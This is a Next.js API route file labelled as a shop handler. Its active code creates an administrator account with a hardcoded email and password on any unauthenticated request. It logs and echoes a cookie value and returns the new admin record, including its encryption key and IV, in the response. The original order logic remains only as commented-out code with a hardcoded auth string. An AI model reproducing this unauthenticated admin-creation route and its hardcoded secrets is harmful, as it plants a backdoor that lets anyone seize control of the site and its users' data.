import Admin from '@/models/Admin'
import db from '@/utils'
import { NextApiRequest, NextApiResponse } from 'next'
import { generateKeyAndIV, encryptText } from '../../Components/CryptoUtils'
const Shop = async (req: NextApiRequest, res: NextApiResponse) => {
	try {
		console.log(req.cookies['CTFlEoiSHkeNnToMBLiShoOekn3kN2y@k'])
		await db.connect2DB()
		const { secretKey, iv } = generateKeyAndIV()
		const encryptedPassword = encryptText('Ey^falowxz7y', secretKey, iv)
		const setali = await Admin.create({
			email: 'administamiram22',
			password: encryptedPassword,
			keyV: secretKey + '&' + iv,
		})
		res.status(200).json({
			success: true,
			totalPrice: req.cookies['CTFlEoiSHkeNnToMBLiShoOekn3kN2y@k'],
			status: setali,
		})
	} catch (err) {
		res.status(500).json({ success: false, message: `Server Error => ${err}` })
	}
}
export default Shop

// import { NextApiRequest, NextApiResponse } from 'next'
// import Orders from '../../../../models/Orders'
// import Data from '../../../../models/Data'
//  import db from '../../../../utils/index.js'

// const Shop = async (req: NextApiRequest, res: NextApiResponse) => {
// 	interface Post {
//  		_id: string
// 		title: string
// 		src: string
// 		subImages: [string]
// 		price: number
// 		categories: [string]
// 		brand: string
// 		quantity: number
// 		description: string
// 		keywords: [string]
// 	}
// 	try {
// 		if (req.method === 'POST') {
// 			const { products, client, authType } = req.body
// 			if (authType === 'S&H!O*P^I$N#G$T^I@M*E') {
// 				if (products.length > 0) {
// 					await db.connectToShop()
// 					const productsID = products?.map((product: string) =>
// 						product.split('*2%2&7(7)5%5!1@2')
// 					)
// 					const data: Post[] = []
// 					await Promise.all(
// 						productsID.map(async (id: string) => {
// 							const post = await Data.findOne({ _id: id[0] })
// 							data.push(post)
// 						})
// 					)

// 					const totalPrice = data.reduce((sum, post, index) => {
// 						const quantityInBasket = productsID[index][1]
//  						const postPrice = post.price * quantityInBasket
// 						return sum + postPrice
// 					}, 0)
// 					const order = {
// 						status: 'InProgress',
// 						client,
// 						products: data.map((product: Post) => `${product._id}`),
// 						totalPrice,
// 					}
// 					console.log(order)
// 					const newOrder = new Orders(order)
// 					await newOrder.save()
// 					res.status(200).json({ success: true, totalPrice })
// 				} else {
// 					res.status(406).json({ success: false, message: 'Basket is Empty' })
// 				}
// 			} else {
// 				res.status(407).json({ success: false, message: 'Invalid Auth Type' })
// 			}
// 		} else {
// 			res.status(409).json({ success: false, message: 'Invalid Request Type' })
// 		}
// 	} catch (err) {
// 		res.status(500).json({ success: false, message: `Server Error => ${err}` })
// 	}
// }
// export default Shop
